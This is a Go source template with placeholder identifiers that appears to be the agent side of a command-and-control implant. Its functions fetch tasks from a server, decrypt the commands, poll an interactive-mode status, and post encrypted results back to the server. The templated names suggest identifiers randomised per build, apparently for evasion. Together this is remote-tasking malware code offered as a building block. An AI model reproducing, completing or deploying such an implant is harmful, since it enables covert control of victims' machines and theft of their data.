func (a *{AGENT_STRUCT_NAME}) {AGENT_GET_TASKS_FUNC}() ([]{TASK_STRUCT_NAME}, error) {
	resp, err := a.{AGENT_SEND_FUNC}("GET", a.{AGENT_TASKS_URI_FIELD}, nil)
	if err != nil {
		return nil, err
	}

	if resp.Status == "success" {
		tasks := resp.Tasks

		for i := range tasks {
			if a.{AGENT_SECRET_KEY_FIELD} != nil {
				decryptedCmd, err := a.{AGENT_DECRYPT_DATA_FUNC}(tasks[i].{TASK_COMMAND_FIELD})
				if err == nil {
					tasks[i].{TASK_COMMAND_FIELD} = decryptedCmd
				}
			}
		}
		return tasks, nil
	}

	return nil, fmt.Errorf("failed to get tasks: %s", resp.Status)
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_INTERACTIVE_STATUS_FUNC}() (bool, error) {
	resp, err := a.{AGENT_SEND_FUNC}("GET", a.{AGENT_INTERACTIVE_STATUS_URI_FIELD}, nil)
	if err != nil {
		return false, err
	}

	if resp.Status == "success" {
		return resp.InteractiveMode, nil
	}

	return false, fmt.Errorf("failed to check interactive status: %s", resp.Status)
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_GET_INTERACTIVE_COMMAND_FUNC}() (*{TASK_STRUCT_NAME}, error) {
	resp, err := a.{AGENT_SEND_FUNC}("GET", a.{AGENT_INTERACTIVE_URI_FIELD}, nil)
	if err != nil {
		return nil, err
	}

	if resp.Status == "success" {
		// Convert TaskID to string regardless of whether it's a number or string
		taskIDStr := ""
		switch v := resp.TaskID.(type) {
		case string:
			taskIDStr = v
		case float64: // JSON numbers are unmarshaled as float64
			taskIDStr = fmt.Sprintf("%.0f", v) // Convert to integer string
		case int64:
			taskIDStr = fmt.Sprintf("%d", v)
		case int:
			taskIDStr = fmt.Sprintf("%d", v)
		case nil:
			taskIDStr = ""
		default:
			taskIDStr = fmt.Sprintf("%v", v)
		}

		if resp.Command != "" {
			taskID, err := strconv.ParseInt(taskIDStr, 10, 64)
			if err != nil {
				taskID = 0 // Default to 0 if parsing fails
			}

			task := &{TASK_STRUCT_NAME}{
				{TASK_ID_FIELD}:      taskID,
				{TASK_COMMAND_FIELD}: resp.Command,
			}

			if a.{AGENT_SECRET_KEY_FIELD} != nil {
				decryptedCmd, err := a.{AGENT_DECRYPT_DATA_FUNC}(task.{TASK_COMMAND_FIELD})
				if err == nil {
					task.{TASK_COMMAND_FIELD} = decryptedCmd
				}
			}

			return task, nil
		} else {
			return nil, nil
		}
	}

	return nil, nil
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_SUBMIT_INTERACTIVE_RESULT_FUNC}(taskID, result string) error {
	var encryptedResult string
	var err error
	if a.{AGENT_SECRET_KEY_FIELD} != nil {
		encryptedResult, err = a.{AGENT_ENCRYPT_DATA_FUNC}(result)
		if err != nil {
			encryptedResult = result
		}
	} else {
		encryptedResult = result
	}

	data := {TASK_RESULT_STRUCT_NAME}{
		{TASK_RESULT_TASK_ID_FIELD}: taskID,
		{TASK_RESULT_RESULT_FIELD}: encryptedResult,
	}

	_, err = a.{AGENT_SEND_FUNC}("POST", a.{AGENT_INTERACTIVE_URI_FIELD}, data)
	return err
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_SUBMIT_TASK_RESULT_FUNC}(taskID, result string) error {
	var encryptedResult string
	var err error
	if a.{AGENT_SECRET_KEY_FIELD} != nil {
		encryptedResult, err = a.{AGENT_ENCRYPT_DATA_FUNC}(result)
		if err != nil {
			encryptedResult = result
		}
	} else {
		encryptedResult = result
	}

	data := {TASK_RESULT_STRUCT_NAME}{
		{TASK_RESULT_TASK_ID_FIELD}: taskID,
		{TASK_RESULT_RESULT_FIELD}: encryptedResult,
	}

	_, err = a.{AGENT_SEND_FUNC}("POST", a.{AGENT_RESULTS_URI_FIELD}, data)
	return err
}

